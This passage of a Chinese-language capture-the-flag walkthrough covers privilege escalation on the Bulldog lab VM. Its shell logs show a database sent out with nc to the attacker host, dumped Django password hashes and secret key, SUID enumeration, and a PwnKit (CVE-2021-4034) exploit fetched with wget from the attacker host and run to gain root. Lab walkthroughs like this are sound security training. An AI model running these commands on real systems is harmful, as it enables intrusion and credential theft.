+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>&lt;/bulldog$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>                     <br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>bash: /root/.bashrc: Permission denied<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>那先看看当前目录下有什么</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bulldog  db.sqlite3  manage.py<br>django@bulldog:/home/django/bulldog$ <span class="hljs-built_in">cat</span> manage.py<br><span class="hljs-built_in">cat</span> manage.py<br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.environ.setdefault(<span class="hljs-string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="hljs-string">&quot;bulldog.settings&quot;</span>)<br><br>    from django.core.management import execute_from_command_line<br><br>    execute_from_command_line(sys.argv)<br></code></pre></td></tr></table></figure>
+
+<p>有个 db.sqlite3 文件，将其通过 nc 发送到攻击机上，攻击机使用 <code>sudo nc -lv -p 333 &gt; db.sqlite3</code>，靶机使用 <code>nc -nv 192.168.56.106 333 &lt; db.sqlite3</code> 来发送文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ nc -nv 192.168.56.106 333 &lt; db.sqlite3<br>nc -nv 192.168.56.106 333 &lt; db.sqlite3<br>Connection to 192.168.56.106 333 port [tcp/*] succeeded!<br></code></pre></td></tr></table></figure>
+
+<h3 id="sqlite3-数据库文件查看"><a href="#sqlite3-数据库文件查看" class="headerlink" title="sqlite3 数据库文件查看"></a>sqlite3 数据库文件查看</h3><p>这里搜了下 sqlite3 数据库文件如何查看</p>
+<ul>
+<li>sqlite3+文件名打开文件</li>
+<li>.tables 查看所有的表</li>
+<li>.schema 查看表结构</li>
+<li>select * from 表名;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ sqlite3 db.sqlite3  <br>SQLite version 3.40.1 2022-12-28 14:03:47<br>Enter <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> usage hints.<br>sqlite&gt;.tables<br>auth_group                  auth_user_user_permissions<br>auth_group_permissions      django_admin_log          <br>auth_permission             django_content_type       <br>auth_user                   django_migrations         <br>auth_user_groups            django_session<br>sqlite&gt; <span class="hljs-keyword">select</span> * from auth_user;<br>1|pbkdf2_sha256$20000$9k0TYJltYWk5<span class="hljs-variable">$rE0aQA4DGFxEjBhBH0BEJhFsF2Jx63690a8VGE</span>/9a+c=|1|admin|||admin@bulldogindustries.com|1|1|2017-08-18 22:42:27.888865|2017-08-19 06:14:22.419010<br>3|pbkdf2_sha256$20000$AvMG3SPMFdWk<span class="hljs-variable">$br74kiJcinPLKkqG</span>+i9G+2MavMVW9IXDl2TSeQ5My+A=|0|alan||||1|1|2017-08-19 05:57:32|<br>4|pbkdf2_sha256$20000$LgCCwZ1qFhSK<span class="hljs-variable">$xv2NHkto76GEp11lXNUFPsiolvoV8c8R</span>/PRl2/XccX0=|0|william||||1|1|2017-08-19 06:02:07|<br>5|pbkdf2_sha256$20000$IjvfpwWo8tw9<span class="hljs-variable">$9PZgYsZCcRz3dLVU</span>/4TnXa9i2VcybBnBedCyNjk3Sak=|0|malik||||1|1|2017-08-19 06:02:50|<br>6|pbkdf2_sha256$20000$ooicdWHyxlTk<span class="hljs-variable">$oNMBAZDKarihoPIzzYAhDq</span>+4cR8JtJGt9JQIA8q1SX8=|0|kevin||||1|1|2017-08-19 06:03:22|<br>7|pbkdf2_sha256$20000$nmdkvhu3yqa9<span class="hljs-variable">$8VSo44h9fXYj6FLavolYDZ7P5PhFBLeKBmLkBlNpGTk</span>=|0|ashley||||1|1|2017-08-19 06:04:18|<br>8|pbkdf2_sha256$20000$QFeEaqreqK8o<span class="hljs-variable">$ldGl5qhFnyB</span>+tFrOflSwxSGO3Xt/mL4sjBiCPyPusU4=|0|nick||||1|1|2017-08-19 06:06:08|2023-07-03 07:32:15.318467<br>9|pbkdf2_sha256$20000$lA6iOt4XGXLw<span class="hljs-variable">$0VHpbYjNiFN4CnHisuB</span>+bFh72A6sn03Q+d34Laj7jkM=|0|sarah||||1|1|2017-08-19 06:06:56|<br>sqlite&gt; <span class="hljs-keyword">select</span> * from auth_permission;<br>1|1|add_logentry|Can add <span class="hljs-built_in">log</span> entry<br>2|1|change_logentry|Can change <span class="hljs-built_in">log</span> entry<br>3|1|delete_logentry|Can delete <span class="hljs-built_in">log</span> entry<br>4|2|add_permission|Can add permission<br>5|2|change_permission|Can change permission<br>6|2|delete_permission|Can delete permission<br>7|3|add_group|Can add group<br>8|3|change_group|Can change group<br>9|3|delete_group|Can delete group<br>10|4|add_user|Can add user<br>11|4|change_user|Can change user<br>12|4|delete_user|Can delete user<br>13|5|add_contenttype|Can add content <span class="hljs-built_in">type</span><br>14|5|change_contenttype|Can change content <span class="hljs-built_in">type</span><br>15|5|delete_contenttype|Can delete content <span class="hljs-built_in">type</span><br>16|6|add_session|Can add session<br>17|6|change_session|Can change session<br>18|6|delete_session|Can delete session<br>sqlite&gt; <span class="hljs-keyword">select</span> * from django_admin_log;<br>1|2017-08-18 22:44:28.935362|2|alan|1||4|1<br>2|2017-08-19 05:52:32.978087|2|alan|3||4|1<br>3|2017-08-19 05:57:32.723768|3|alan|1||4|1<br>4|2017-08-19 06:02:07.988633|4|william|1||4|1<br>5|2017-08-19 06:02:50.604910|5|malik|1||4|1<br>6|2017-08-19 06:03:22.814721|6|kevin|1||4|1<br>7|2017-08-19 06:04:18.210702|7|ashley|1||4|1<br>8|2017-08-19 06:06:08.629082|8|nick|1||4|1<br>9|2017-08-19 06:06:56.356511|9|sarah|1||4|1<br>10|2017-08-19 06:13:55.722525|8|nick|2|Changed password.|4|1<br>11|2017-08-19 06:14:50.804394|3|alan|2|Changed is_staff.|4|1<br>12|2017-08-19 06:14:57.811418|7|ashley|2|Changed is_staff.|4|1<br>13|2017-08-19 06:15:08.187751|6|kevin|2|Changed is_staff.|4|1<br>14|2017-08-19 06:15:18.199899|5|malik|2|Changed is_staff.|4|1<br>15|2017-08-19 06:15:25.607889|8|nick|2|Changed is_staff.|4|1<br>16|2017-08-19 06:15:32.692866|9|sarah|2|Changed is_staff.|4|1<br>17|2017-08-19 06:15:42.247879|4|william|2|Changed is_staff.|4|1<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>翻看了一下，密码是经过 pbkdf2_sha256 哈希的，碰撞难度较大，只能算是拿到了一些用户名。回到刚才的 shell 中，继续进行信息收集，在当前目录的子目录下，找到一个 settings.py 文件，其中有个 secret_key，但是搜索了一下似乎没法用来提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog/bulldog$ <span class="hljs-built_in">cat</span> settings.py<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Django settings for bulldog project.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Generated by &#x27;django-admin startproject&#x27; using Django 1.8.7.</span><br><span class="hljs-string"></span><br><span class="hljs-string">For more information on this file, see</span><br><span class="hljs-string">https://docs.djangoproject.com/en/1.8/topics/settings/</span><br><span class="hljs-string"></span><br><span class="hljs-string">For the full list of settings and their values, see</span><br><span class="hljs-string">https://docs.djangoproject.com/en/1.8/ref/settings/</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># Build paths inside the project like this: os.path.join(BASE_DIR, ...)</span><br>import os<br><br>BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))<br><br><br><span class="hljs-comment"># Quick-start development settings - unsuitable for production</span><br><span class="hljs-comment"># See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/</span><br><br><span class="hljs-comment"># SECURITY WARNING: keep the secret key used in production secret!</span><br>SECRET_KEY = <span class="hljs-string">&#x27;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;u+o_g$yi83d*riq&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="定时任务和SUID"><a href="#定时任务和SUID" class="headerlink" title="定时任务和SUID"></a>定时任务和SUID</h3><p>看看定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>看看 s 权限文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   407927     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   278771     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>   280147     16 -rwsr-xr-x   1 root     root          14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br>   279434    420 -rwsr-xr-x   1 root     root         428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign<br>   262725     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>   280225    204 -rwsr-xr-x   1 root     root         208680 Apr 29  2017 /usr/lib/snapd/snap-confine<br>   262540     56 -rwsr-xr-x   1 root     root          54256 May 16  2017 /usr/bin/passwd<br>   280156     24 -rwsr-xr-x   1 root     root          23376 Jan 17  2016 /usr/bin/pkexec<br>   262529     40 -rwsr-xr-x   1 root     root          39904 May 16  2017 /usr/bin/newgrp<br>   279685     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at<br>   262624    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo<br>   278786     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newuidmap<br>   262404     40 -rwsr-xr-x   1 root     root          40432 May 16  2017 /usr/bin/chsh<br>   278787     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newgidmap<br>   262465     76 -rwsr-xr-x   1 root     root          75304 May 16  2017 /usr/bin/gpasswd<br>   262402     52 -rwsr-xr-x   1 root     root          49584 May 16  2017 /usr/bin/chfn<br>   131149     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping<br>   131135     40 -rwsr-xr-x   1 root     root          40152 Jun 14  2017 /bin/mount<br>   131184     28 -rwsr-xr-x   1 root     root          27608 Jun 14  2017 /bin/umount<br>   131166     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su<br>   131150     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6<br>   133809     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount<br>   133812    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g<br></code></pre></td></tr></table></figure>
+
+<p>有 polkit-agent-helper-1和 pkexec，应该可以使用 <code>CVE-2021-4034</code>，不过还是一步一步尝试有没有别的攻击路径，<code>/bin/ntfs-3g</code> 是第一次见到，搜索一下的确有个脚本：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41240">ntfs-3g (Debian 9) - Local Privilege Escalation - Linux local Exploit (exploit-db.com)</a></p>
+<p>尝试运行，但是并没有成功，错误信息如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[-] FAILED: your need make / build tools<br>./41240.sh: line 61: /tmp/r00t: No such file or directory<br>./41240.sh: line 62: /tmp/r00t: No such file or directory<br><br></code></pre></td></tr></table></figure>
+
+<p>看了眼源码，应该是没有利用成功，没复制 bash 文件到 tmp 中，导致最后找不到文件。</p>
+<h3 id="隐藏文件查找"><a href="#隐藏文件查找" class="headerlink" title="隐藏文件查找"></a>隐藏文件查找</h3><p>看看可写文件吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/home/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null<br>&lt; -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/home/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null   <br>/.hiddenAVDirectory/AVApplication.py<br></code></pre></td></tr></table></figure>
+
+<p>根目录下有个可写的脚本文件，看看这个文件的信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ <span class="hljs-built_in">ls</span> -liah /.hiddenAVDirectory/AVApplication.py<br><span class="hljs-built_in">ls</span> -liah /.hiddenAVDirectory/AVApplication.py<br>141860 -rwxrwxrwx 1 root root 157 Aug 26  2017 /.hiddenAVDirectory/AVApplication.py<br>django@bulldog:/home/django$ <span class="hljs-built_in">cd</span> /.hiddenAVDirectory<br><span class="hljs-built_in">cd</span> /.hiddenAVDirectory<br>django@bulldog:/.hiddenAVDirectory$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>131483 drwxr-xr-x  2 root root 4.0K Aug 26  2017 .<br>     2 drwxr-xr-x 24 root root 4.0K Aug 26  2017 ..<br>141860 -rwxrwxrwx  1 root root  157 Aug 26  2017 AVApplication.py<br></code></pre></td></tr></table></figure>
+
+<p>这个应该就是之前提过的入侵检测程序，不过有点简陋，而且权限是 777，感觉可能是个突破点，但是如果没有找到调用它的方式那也无济于事，<code>ps aux</code> 和 <code>netsat -a</code> 翻找了一下没有发现可利用的点。刚开始觉得这个文件或许有突破口花了不少心思排除，浪费了不少时间。</p>
+<p>接下来就逐层文件夹翻翻吧，首先看看 home 目录下的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 16K<br>    12 drwxr-xr-x  4 root         root         4.0K Aug 24  2017 .<br>     2 drwxr-xr-x 24 root         root         4.0K Aug 26  2017 ..<br>   687 drwxr-xr-x  5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 bulldogadmin<br>131698 drwxr-xr-x  5 django       django       4.0K Sep 21  2017 django<br></code></pre></td></tr></table></figure>
+
+<p>home 目录下只有两个文件夹：django 和 bulldogadmin，进入 bulldogadmin 查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home$ <span class="hljs-built_in">cd</span> bulldogadmin<br><span class="hljs-built_in">cd</span> bulldogadmin<br>django@bulldog:/home/bulldogadmin$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>   687 drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .<br>    12 drwxr-xr-x 4 root         root         4.0K Aug 24  2017 ..<br> 16091 -rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout<br> 16190 -rw-r--r-- 1 bulldogadmin bulldogadmin 3.7K Aug 24  2017 .bashrc<br> 16850 drwx------ 2 bulldogadmin bulldogadmin 4.0K Aug 24  2017 .cache<br>141810 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .hiddenadmindirectory<br> 16892 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Aug 25  2017 .nano<br> 16235 -rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile<br> 16888 -rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor<br> 16854 -rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful<br> 16232 -rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts<br>django@bulldog:/home/bulldogadmin$ <span class="hljs-built_in">cd</span> .hiddenadmindirectory<br><span class="hljs-built_in">cd</span> .hiddenadmindirectory<br>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>141810 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .<br>   687 drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 ..<br>141862 -rw-r--r-- 1 bulldogadmin bulldogadmin 8.6K Aug 26  2017 customPermissionApp<br>141866 -rw-rw-r-- 1 bulldogadmin bulldogadmin  619 Sep 21  2017 note<br>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ <span class="hljs-built_in">cat</span> note<br><span class="hljs-built_in">cat</span> note<br>Nick,<br><br>I<span class="hljs-string">&#x27;m working on the backend permission stuff. Listen, it&#x27;</span>s super prototype but I think it<span class="hljs-string">&#x27;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="hljs-string"></span><br><span class="hljs-string">It&#x27;</span>s great stuff! Once I<span class="hljs-string">&#x27;m finished with it, a hacker wouldn&#x27;</span>t even be able to reverse it! Keep <span class="hljs-keyword">in</span> mind that it<span class="hljs-string">&#x27;s still a prototype right now. I am about to get it working with the Django user account. I&#x27;</span>m not sure how I<span class="hljs-string">&#x27;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let me know what you think of it!</span><br><span class="hljs-string"></span><br><span class="hljs-string">-Ashley</span><br></code></pre></td></tr></table></figure>
+
+<p>有一段话，大意是开发了一个新的后端权限工具，输入账户密码就可以获取到文件的权限了，我尝试把文件下载到攻击机然后再上传到靶机的 tmp 目录，发现确实提示需要输入密码，使用 cat 命令查看 <code>customPermissionApp</code> 有很多乱码，所以使用 strings 命令查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ strings customPermissionApp            <br>/lib64/ld-linux-x86-64.so.2<br>32S0-t<br>libc.so.6<br>puts<br>__stack_chk_fail<br>system<br>__libc_start_main<br>__gmon_start__<br>GLIBC_2.4<br>GLIBC_2.2.5<br>UH-H<br>SUPERultH<br>imatePASH<br>SWORDyouH<br>CANTget<br>dH34%(<br>AWAVA<br>AUATL<br>[]A\A]A^A_<br>Please enter a valid username to use root privileges<br>        Usage: ./customPermissionApp &lt;username&gt;<br>sudo su root<br></code></pre></td></tr></table></figure>
+
+<p>上面只列了一部分，给出了此文件的用法，执行的时候加上用户名即可，这里一开始没看出上面几行字中其实就藏着密码</p>
+<h3 id="CVE-2021-4034-提权"><a href="#CVE-2021-4034-提权" class="headerlink" title="CVE-2021-4034 提权"></a>CVE-2021-4034 提权</h3><p>我是使用了刚才提到的 CVE-2021-4034 来进行的提权，所使用的编译好的二进制文件可以在这里找到<a target="_blank" rel="noopener" href="https://github.com/dzonerzy/poc-cve-2021-4034">dzonerzy&#x2F;poc-cve-2021-4034: PoC for CVE-2021-4034 dubbed pwnkit (github.com)</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/tmp$ wget http://192.168.56.106:8088/exploit<br>wget http://192.168.56.106:8088/exploit<br>--2023-07-03 09:30:45--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit             100%[===================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.03s   <br><br>2023-07-03 09:30:45 (129 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>django@bulldog:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit<br><span class="hljs-built_in">chmod</span> +x exploit<br>django@bulldog:/tmp$ ./exploit  <br>./exploit<br>2023/07/03 04:30:56 CMDTOEXECUTE is empty fallback to default value<br>2023/07/03 04:30:56 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>congrats.txt<br><span class="hljs-comment"># cat congrats.txt</span><br><span class="hljs-built_in">cat</span> congrats.txt<br>Congratulations on completing this VM :D That wasn<span class="hljs-string">&#x27;t so bad was it?</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let 